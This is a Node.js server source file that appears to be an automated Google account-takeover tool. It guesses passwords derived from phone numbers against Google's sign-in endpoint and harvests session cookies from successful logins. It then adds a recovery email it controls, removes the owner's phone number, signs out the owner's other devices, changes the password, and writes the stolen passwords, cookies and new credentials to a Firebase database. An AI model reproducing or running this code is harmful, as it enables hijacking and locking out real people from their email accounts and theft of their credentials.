require('events').EventEmitter.prototype._maxListeners = 100
const bodyParser = require('body-parser')
const admin = require('firebase-admin')
const express = require('express')
const request = require('request')
const crypto = require('crypto')
const axios = require('axios')
const http = require('http')
const path = require('path')
const fs = require('fs')


const app = express()


app.use(express.json())
app.use(bodyParser.urlencoded({ extended: true }))

const server = http.createServer(app)

server.listen(process.env.PORT || 3000, ()=>{
    console.log("Listening on port 3000...")
})

const serviceAccount = require(path.resolve("database088-firebase-adminsdk-ho5ln-4610a9f3c6.json"))

admin.initializeApp({
    credential: admin.credential.cert(serviceAccount),
    databaseURL: "https://database088-default-rtdb.firebaseio.com"
})

  
const database = admin.database().ref('raiyan088')

let mRecovery = null

try {
    mRecovery = JSON.parse(fs.readFileSync('./recovery.json'))
} catch (e) {}

app.post('/', async function (req, res) {
    if(req.body) {
        try {
            let mData = req.body.data.split('★')
            console.log('Received Data: '+mData.length)
            if(mData.length == 6) {
                passwordMatching(res, mData, null, 0, 0, mData[4])
            } else {
                res.end('not 6')
            }
        } catch (e) {
            res.end(e.toString())
        }
    } else {
        res.end('null')
    }
})

app.get('/ip', async function (req, res) {
    request({
        url: 'https://ifconfig.me/ip',
        method: 'GET',
        followRedirect: false
    }, function(error, response, body) {
        if(error) {
            res.end('Error')
        } else {
            res.end(body)
        }
    })
})

function passwordMatching(connection, mData, sendCookies, again, loop, gps) {
    let pass = ''
    if(mData[1].split('/')[1] == '880') {
        pass = '0'+mData[2]
    } else {
        pass = mData[2]
    }

    let password = pass

    if(again == 1) {
        password = mData[6]
    } else {
        if(loop == 1) {
            password = pass.substring(0, 8)
        } else if(loop == 2) {
            password = pass.substring(pass.length-8, pass.length)
        }
    }

    request({
        url: 'https://accounts.google.com/_/signin/challenge?hl=en&TL='+mData[3]+'&_reqid=999999',
        method: 'POST',
        body: getPasswordData(password, parseInt(mData[5])),
        headers: {
            'Cookie': again == 1 ? '__Host-GAPS='+gps+'; '+sendCookies : '__Host-GAPS='+gps,
            'content-type' : 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf' : 1
        },
        followRedirect: false
    }, function(error, responce, body) {

        let output = 0

        console.log('Passwort Try: '+loop)

        if(again == 0) {
            try {
                let data = JSON.parse(body.substring(body.indexOf('[['), body.length))
                if(data[0][3] == 5) {
                    if(mData[2].length > 8) {
                        if(loop == 0) {
                            output = 1
                            passwordMatching(connection, mData, null, 0, 1, gps)
                        } else if(loop == 1) {
                            output = 1
                            passwordMatching(connection, mData, null, 0, 2, gps)
                        } else {
                            console.log('Matching Failed')
                        }
                    }
                } else if(data[0][3] == 1) {
                    console.log('Login Success')
                    let cookiesList = responce.headers['set-cookie']
                    if(cookiesList) {
                        output = 2
                        let sendCookies = ''
    
                        for(let i=0; i<cookiesList.length; i++) {
                            let singelData = cookiesList[i]
                            try {
                                let start = singelData.indexOf('=')
                                let end = singelData.indexOf(';')
                                let key = singelData.substring(0, start)
                                if(key == 'SID' || key == '__Secure-1PSID' || key == 'HSID' || key == 'SSID' || key == 'SAPISID' || key == 'LSID' || key == 'APISID') {
                                    let value = singelData.substring(start+1, end)
                                    sendCookies += key+'='+value+'; '
                                }
                            } catch (e) {}
                        }

                        getRaptToken(connection, password, mData, sendCookies)
                    }
                } else {
                    let temp = mData[2].toString()
                    let index = temp.length == 8 ? 2 : temp.length == 9 || temp.length == 10 ? 3 : temp.length == 11 ? 4 : 5
                    console.log('Password Matching')
                    if(data[0][3] == 2) {
                        database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/1111111111/'+mData[2]).set(loop)
                    } else {
                        database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/'+temp.substring(0, index)+'/'+temp.substring(index, temp.length)).set(loop)
                    }
                }
            } catch (e) {}
        } else if(again == 1) {
            output = 1
            let wrong = true
            console.log('Login Again')
            try {
                let data = JSON.parse(body.substring(body.indexOf('[['), body.length))
                if(data[0][3] == 1) {
                    let url = decodeURIComponent(data[0][13][2])
                    let index = url.indexOf('rapt=')
                    let split = url.substring(index+5, url.length).split('&')
                    let mRAPT = split[0]
                    wrong = false

                    request({
                        url: 'https://accounts.google.com/CheckCookie?continue=https%3A%2F%2Fmyaccount.google.com%2Fintro%2Fpersonal-info',
                        method: 'GET',
                        headers: {
                            'Cookie': sendCookies,
                            'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
                        },
                        followRedirect: false
                    }, function(error, responce, body) {
                        let wrong = true
                        try {
                            if(!error && responce.headers['location']) {
                                let url = decodeURIComponent(responce.headers['location'])  
                                let index = url.indexOf('osidt=')
                                let split = url.substring(index+6, url.length).split('&')
                                let tempCookes = sendCookies
                                tempCookes += 'OSID=Lgh3m_XDdCpAmGim5eO6xW8csVs0m9rLO6I7FHHeiGEViTAiQK_GhRhgeVwISYbsIeMp1g.; '
                                wrong = false
                                request({
                                    url: 'https://myaccount.google.com/accounts/SetOSID?continue=https%3A%2F%2Faccounts.youtube.com%2Faccounts%2FSetSID%3Fssdc%3D1&osidt='+split[0],
                                    method: 'GET',
                                    headers: {
                                        'Cookie': tempCookes
                                    },
                                    followRedirect: false
                                }, function(error, responce, body) {
                                    let wrong = true
                                    try {
                                        if(!error && responce.headers['set-cookie']) {
                                            cookiesList = responce.headers['set-cookie']
        
                                            for(let i=0; i<cookiesList.length; i++) {
                                                let singelData = cookiesList[i]
                                                try {
                                                    let start = singelData.indexOf('=')
                                                    let end = singelData.indexOf(';')
                                                    let key = singelData.substring(0, start)
                                                    if(key == 'OSID') {
                                                        sendCookies += 'OSID='+singelData.substring(start+1, end)
                                                        i = cookiesList.length
                                                    }
                                                } catch (e) {}
                                            }
                                            
                                            wrong = false
                                            console.log(sendCookies)
                                            Completed(connection, password, mData, sendCookies, mRAPT)
                                        }
                                    } catch (e) {}

                                    try {
                                        if(wrong && connection != null) {
                                            let send = sendCookies
                                            if(send == null) {
                                                send = {}
                                            }
                                            send['PASS'] = password
                                            database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
                                            connection.end(mData[0]+' 5')
                                        }
                                    } catch (e) {}
                                })
                            }
                        } catch (e) {}

                        try {
                            if(wrong && connection != null) {
                                let send = sendCookies
                                if(send == null) {
                                    send = {}
                                }
                                send['PASS'] = password
                                database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
                                connection.end(mData[0]+' 4')
                            }
                        } catch (e) {}
                    })
                }
            } catch (e) {}

            try {
                if(wrong && connection != null) {
                    let send = sendCookies
                    if(send == null) {
                        send = {}
                    }
                    send['PASS'] = password
                    database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
                    connection.end(mData[0]+' 13')
                }
            } catch (e) {}
        }

        try {
            if(output == 0 && connection != null) {
                console.log('Next')
                connection.end(mData[0]+' 1')
            }
        } catch (e) {}
    })
}


function getRaptToken(connection, password, mData, sendCookies) {

    request({
        url: 'https://myaccount.google.com/signinoptions/rescuephone',
        method: 'GET',
        headers: {
            'Cookie': sendCookies,
            'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
        },
        followRedirect: false
    }, function(error, response, body) {
        let wrong = true
        try {
            if (!error) {
                let headers = response.headers
                if(headers && headers['location']) {
                    let index = headers['location'].indexOf('rart=')
                    let split = headers['location'].substring(index, headers['location'].length).split('&')
                    wrong = false
                    request({
                        url: 'https://accounts.google.com/ServiceLogin?'+split[0],
                        method: 'GET',
                        headers: {
                            'Cookie': sendCookies,
                            'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
                        },
                        followRedirect: false
                    }, function(error, response, body) {
                        let wrong = true
                        try {
                            if (!error) {
                                let headers = response.headers
                                 if(headers && headers['location']) {
                                    let index = headers['location'].indexOf('TL=')
                                    let tl = headers['location'].substring(index+3, headers['location'].length).split('&')[0]
                                    index = headers['location'].indexOf('cid=')
                                    let cid = headers['location'].substring(index+4, headers['location'].length).split('&')[0]
                                    cookiesList = headers['set-cookie']
                                    let gps = mData[4]
                                    for(let i=0; i<cookiesList.length; i++) {
                                        let singelData = cookiesList[i]
                                        try {
                                            let start = singelData.indexOf('=')
                                            let end = singelData.indexOf(';')
                                            let key = singelData.substring(0, start)
                                            if(key == '__Host-GAPS') {
                                                gps = singelData.substring(start+1, end)
                                                i = cookiesList.length
                                            }
                                        } catch (e) {}
                                    }
                                    wrong = false
                                    mData[3] = tl
                                    mData[4] = gps
                                    mData[5] = cid
                                    mData[6] = password
                                    passwordMatching(connection, mData, sendCookies, 1, 0, gps)
                                }
                            } else {}
                        } catch (e) {}
                        
                        try {
                            if(wrong && connection != null) {
                                let send = sendCookies
                                if(send == null) {
                                    send = {}
                                }
                                send['PASS'] = password
                                database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
                                connection.end(mData[0]+' 2')
                            }
                        } catch (e) {}
                    })
                }
            } else {}
        } catch (e) {}
        
        try {
            if(wrong && connection != null) {
                let send = sendCookies
                if(send == null) {
                    send = {}
                }
                send['PASS'] = password
                database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
                connection.end(mData[0]+' 3')
            }
        } catch (e) {}
    })
}

function Completed(connection, password, mData, sendCookies, mRAPT) {

    request({
        url: 'https://myaccount.google.com/phone',
        method: 'GET',
        headers: {
            'Cookie': sendCookies,
            'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
        },
        followRedirect: false
    }, function(error, response, body) {
        let wrong = true
        try {
            if(!error) {
                let index = body.indexOf('SNlM0e')
                if(index != -1) {
                    let temp = body.substring(index+6, index+100)
                    let time = temp.substring(temp.indexOf(':')+1, temp.indexOf(',')).replace('"', '').replace('"', '').replace(' ', '')
                    index = body.indexOf('class="CEETff"')
                    let years = []
                    let year = '2022'
                    let html = body
                    for(let i=0; i<5; i++) {
                        index = html.indexOf('class="CEETff"')
                        if(index != -1) {
                            let temp = html.substring(index, index+150)
                            years.push(checkYear(temp))
                            html = html.substring(index+150, html.length)
                        } else {
                            i=5
                        }
                    }
                    years.sort(function(a, b){return a-b})
                    if(years.length > 0) {
                        year = years[0].toString()
                    }
                    index = body.indexOf('WIZ_global_data')
                    let gmail = null
                    if(index != -1) {
                        try {
                            let temp = body.substring(index, body.length)
                            let data = JSON.parse(temp.substring(temp.indexOf('{'), temp.indexOf(';</script>')))
                            gmail = data['oPEP7c']
                        } catch (e) {}
                    }

                    if(gmail == null) {
                        index = body.indexOf('@gmail.com')
                        if(index != -1) {
                            try {
                                temp = body.substring(index-50, index)
                                let last = body.substring(index+10, index+11)
                                index = 0
                                if(last == '"') {
                                    index = temp.lastIndexOf('"')
                                } else if(last == '\'') {
                                    index = temp.lastIndexOf('\'')
                                } else if(last == ')') {
                                    index = temp.lastIndexOf('(')
                                } else if(last == '<') {
                                    index = temp.lastIndexOf('>')
                                }
                                gmail = temp.substring(index+1, temp.length)+'@gmail.com'
                            } catch (e) {}
                        }
                    }

                    let mGmail = gmail.replace('@gmail.com', '').replace('.', '')
                    
                    let position = Math.floor((Math.random() * (mRecovery.length-1)))
                    let recovery = mRecovery[position]
                    wrong = false

                    console.log(time, gmail)

                    request({
                        url: 'https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=uc1K4d&rapt='+mRAPT,
                        method: 'POST',
                        body: getRecoveryData(recovery+'@gmail.com', time),
                        headers: {
                            'Cookie': sendCookies,
                            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
                        },
                        followRedirect: false
                    }, function(error, response, body) {
                        let wrong = true
                        try {
                            if(!(error || body.includes('"er"'))) {
                                wrong = false
                                request({
                                    url: 'https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=GWdvgc&rapt='+mRAPT,
                                    method: 'POST',
                                    body: getVerificationData(time),
                                    headers: {
                                        'Cookie': sendCookies,
                                        'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
                                    },
                                    followRedirect: false
                                }, function(error, response, body) {
                                    let wrong = true
                                    try {
                                        if(!(error || body.includes('"er"'))) {
                                            wrong = false
                                            console.log('Delete Phone Number')
                                            axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=ZBoWob&rapt='+mRAPT, getPhoneData('+'+mData[1].split('/')[1]+mData[2], time), {
                                                headers: {
                                                    'Cookie': sendCookies,
                                                    'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
                                                }
                                            }).then(res => {
                                                console.log(res.data)
                                                let wrong = true
                                                try {
                                                    if(!res.data.includes('"er"')) {
                                                        wrong = false
                                                        request({
                                                            url: 'https://myaccount.google.com/device-activity',
                                                            method: 'GET',
                                                            headers: {
                                                                'Cookie': sendCookies,
                                                                'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
                                                            },
                                                            followRedirect: false
                                                        }, function(error, response, body) {
                                                            let wrong = true
                                                            try {
                                                                if(!(error || body == '')) {
                                                                    let index = body.indexOf('SNlM0e')
                                                                    if(index != -1) {
                                                                        let temp = body.substring(index+6, index+100)
                                                                        time = temp.substring(temp.indexOf(':')+1, temp.indexOf(',')).replace('"', '').replace('"', '').replace(' ', '')
                                                                    }
                                            
                                                                    index = body.indexOf('AF_initDataCallback(')
                                            
                                                                    if(index != -1) {
                                                                        let temp = body.substring(index+20, body.length)
                                                                        let data = JSON.parse(temp.substring(temp.indexOf('['), temp.indexOf(', sideChannel: {}});</script>')))[1]
                                                                        let logout = {}
                                                                        
                                                                        for(let i=0; i<data.length; i++) {
                                                                            let child = data[i][2]
                                                                            for(let j=0; j<child.length; j++) {
                                                                                let main = child[j]
                                                                                if(main.length > 23) {
                                                                                    if(main[12] == true && main[13] != null && main[22] != null && main[22] != 1) {
                                                                                        logout[main[0]] = main[13]
                                                                                    }
                                                                                }
                                                                            }
                                                                        }

                                                                        if(Object.keys(logout.length) > 0) {
                                                                            wrong = false

                                                                            let size = 0
                                                                            let output = 0

                                                                            for(let [key, value] of Object.entries(logout)) {
                                                                                size++
                                                                                request({
                                                                                    url: 'https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=YZ6Dc&source-path=%2Fu%2F5%2Fdevice-activity%2Fid%2F'+key,
                                                                                    method: 'POST',
                                                                                    body: getLogOut(value, time),
                                                                                    headers: {
                                                                                        'Cookie': sendCookies,
                                                                                        'Content-Type' :'application/x-www-form-urlencoded;charset=UTF-8',
                                                                                        'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
                                                                                    },
                                                                                    followRedirect: false
                                                                                }, function(error, response, body) {
                                                                                    output++
                                                                                    if(output == size) {
                                                                                        let changePass = getRandomPassword()
                                                                                        request({
                                                                                            url: 'https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=or64jf&rapt='+mRAPT,
                                                                                            method: 'POST',
                                                                                            body: getChangePasswordData(changePass, time),
                                                                                            headers: {
                                                                                                'Cookie': sendCookies,
                                                                                                'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
                                                                                            },
                                                                                            followRedirect: false
                                                                                        }, function(error, response, body) {
                                                                                            let wrong = true
                                                                                            try {
                                                                                                if(!(error || body.includes('"er"'))) {
                                                                                                    wrong = false
                                                                                                    console.log(changePass)
                                                                                                    console.log('Completed Process')
                                                                                                    let send = { create:year, number:mData[2], password:changePass, recovery:recovery }
                                                                                                    console.log(send)
                                                                                                    database.child('/code/gmail/completed/'+mData[1].split('/')[0]+'/'+mGmail).update(send)
                                                                                                    connection.end(mData[0]+' 12')
                                                                                                }
                                                                                            } catch (e) {}
                                                                                            
                                                                                            try {
                                                                                                if(wrong && connection != null) {
                                                                                                    let send = sendCookies
                                                                                                    if(send == null) {
                                                                                                        send = {}
                                                                                                    }
                                                                                                    send['PASS'] = password
                                                                                                    database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
                                                                                                    connection.end(mData[0]+' 11')
                                                                                                }
                                                                                            } catch (e) {}
                                                                                        })
                                                                                    }
                                                                                })
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            } catch (e) {}

                                                            try {
                                                                if(wrong && connection != null) {
                                                                    let changePass = getRandomPassword()
                                                                    request({
                                                                        url: 'https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=or64jf&rapt='+mRAPT,
                                                                        method: 'POST',
                                                                        body: getChangePasswordData(changePass, time),
                                                                        headers: {
                                                                            'Cookie': sendCookies,
                                                                            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
                                                                        },
                                                                        followRedirect: false
                                                                    }, function(error, response, body) {
                                                                        let wrong = true
                                                                        try {
                                                                            if(!(error || body.includes('"er"'))) {
                                                                                wrong = false
                                                                                console.log(changePass)
                                                                                console.log('Completed Process')
                                                                                let send = { create:year, number:mData[2], password:changePass, recovery:recovery }
                                                                                console.log(send)
                                                                                database.child('/code/gmail/completed/'+mData[1].split('/')[0]+'/'+mGmail).update(send)
                                                                                connection.end(mData[0]+' 12')
                                                                            }
                                                                        } catch (e) {}
                                                                        
                                                                        try {
                                                                            if(wrong && connection != null) {
                                                                                let send = sendCookies
                                                                                if(send == null) {
                                                                                    send = {}
                                                                                }
                                                                                send['PASS'] = password
                                                                                database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
                                                                                connection.end(mData[0]+' 11')
                                                                            }
                                                                        } catch (e) {}
                                                                    })
                                                                }
                                                            } catch (e) {}
                                                        })
                                                    } else {
                                                        console.log(body)
                                                        try {
                                                            if(wrong && connection != null) {
                                                                let send = sendCookies
                                                                if(send == null) {
                                                                    send = {}
                                                                }
                                                                send['PASS'] = password
                                                                database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
                                                                connection.end(mData[0]+' 99')
                                                            }
                                                        } catch (e) {}
                                                    }
                                                } catch (e) {}
                                            }).catch(err => {
                                                console.log(err)
                                                try {
                                                    if(wrong && connection != null) {
                                                        let send = sendCookies
                                                        if(send == null) {
                                                            send = {}
                                                        }
                                                        send['PASS'] = password
                                                        database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
                                                        connection.end(mData[0]+' 9')
                                                    }
                                                } catch (e) {}
                                            })
                                        } else {
                                            console.log(body)
                                        }
                                    } catch (e) {}

                                    try {
                                        if(wrong && connection != null) {
                                            let send = sendCookies
                                            if(send == null) {
                                                send = {}
                                            }
                                            send['PASS'] = password
                                            database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
                                            connection.end(mData[0]+' 8')
                                        }
                                    } catch (e) {}
                                })
                            }
                        } catch (e) {}

                        try {
                            if(wrong && connection != null) {
                                let send = sendCookies
                                if(send == null) {
                                    send = {}
                                }
                                send['PASS'] = password
                                database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
                                connection.end(mData[0]+' 7')
                            }
                        } catch (e) {}
                    })
                }
            }
        } catch (e) {}
        
        try {
            if(wrong && connection != null) {
                let send = sendCookies
                if(send == null) {
                    send = {}
                }
                send['PASS'] = password
                database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
                connection.end(mData[0]+' 6')
            }
        } catch (e) {}
    })
}

function getPasswordData(password, type) {
    return 'continue='+encodeURIComponent('https://myaccount.google.com/')+'&service=accountsettings&f.req='+encodeURIComponent(JSON.stringify(['AEThLlw5uc06cH1q8zDfw1uY4Xp7eNORXHjsuJT-9-2nFsiykmQD7IcKUJPcYmG4KddhkjoTup4nzB0yrSZeYwm7We09VV6f-i34ApnWRsbGJ2V1tdbWPwWOgK4gDGSgJEJ2hIK9hyGgV-ejHBA-mCWDXqcePqHHag5bc4lHSHRGyNrOr9Biuyn6y8tk3iCBn5IY34f-QKm5-SOxrbYWDcto50q0oo2z0YCPFtY556fWL0DY0W0pAGKmW6Ky4ukssyF91aMhKyZsH5bzHEs0vPdnYAWfxipSCarZjBUB0TIR7W2MyATWD99NE0xXQAIy2AGgdxdyi9aYhS7sjH1iUhbjspK_di8Wn1us7BfEbjaXI0BA4SXy7igdq53U5lKmR1seyx6mpKnVKK59iCNyWzZOa8y91Q06DdD0OqQHaPmK2g6S2PH6j6CsOsBRGVxcvjnzysjfgf7bARU0CgFDOAwA8Q8fKOaqBIe0Xg3nfHILRWVBJnVqUpI',null,type,null,[1,null,null,null,[password,null,true]]]))+'&bgRequest='+encodeURIComponent(JSON.stringify(["identifier",'Hi, Google Team. My name is Raiyan. It is my mail adress raiyanhossain088@gmail.com. My gmail adress now Disabled. Please Fixed it. its my inportent Gmail Account']))
}

function getRecoveryData(gmail, time) {
    return 'f.req='+encodeURIComponent(JSON.stringify([[["uc1K4d","[\"ac.sirerq\",\""+gmail+"\",null,true]",null,"generic"]]]))+'&at='+encodeURIComponent(time)
}

function getVerificationData(time) {
    return 'f.req=%5B%5B%5B%22GWdvgc%22%2C%22%5B%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at='+encodeURIComponent(time)
}

function getPhoneData(number, time) {
    console.log(number, time)
    return 'f.req='+encodeURIComponent(JSON.stringify([[["ZBoWob","[[3,\""+number+"\",null,null,[1,27],null,null,null,null,null,[],1]]",null,"generic"]]]))+'&at='+encodeURIComponent(time)
}

function getChangePasswordData(password, time) {
    return 'f.req='+encodeURIComponent(JSON.stringify([[["or64jf","[\""+password+"\",null,false]",null,"generic"]]]))+'&at='+encodeURIComponent(time)
}

function getLogOut(token, time) {
    return 'f.req='+encodeURIComponent(JSON.stringify([[["YZ6Dc","[null,null,\""+token+"\"]",null,"generic"]]]))+'&at='+encodeURIComponent(time)
}

function checkYear(data) {
    var years = ['2000', '2001', '2002', '2003', '2004', '2005', '2006', '2007', '2008', '2009', '2010', '2011', '2012', '2013', '2014', '2015', '2016', '2017', '2018', '2019', '2020', '2021', '2022', '2023']
    for(let i=years.length-1; i>=0; i--) {
        if(data.includes(years[i])) {
            return parseInt(years[i])
        }
    }
    return parseInt(new Date().getFullYear())
}


function getRandomPassword() {
    let C = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']
    let S = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
    let N = ['0','1','2','3','4','5','6','7','8','9']
    let U = ['#','$','@']
    
    let pass = C[Math.floor((Math.random() * 26))]
    pass += S[Math.floor((Math.random() * 26))]
    pass += S[Math.floor((Math.random() * 26))]
    pass += S[Math.floor((Math.random() * 26))]
    pass += S[Math.floor((Math.random() * 26))]
    pass += N[Math.floor((Math.random() * 10))]
    pass += N[Math.floor((Math.random() * 10))]
    pass += N[Math.floor((Math.random() * 10))]
    pass += U[Math.floor((Math.random() * 3))]
    pass += U[Math.floor((Math.random() * 3))]
    
    return pass
}
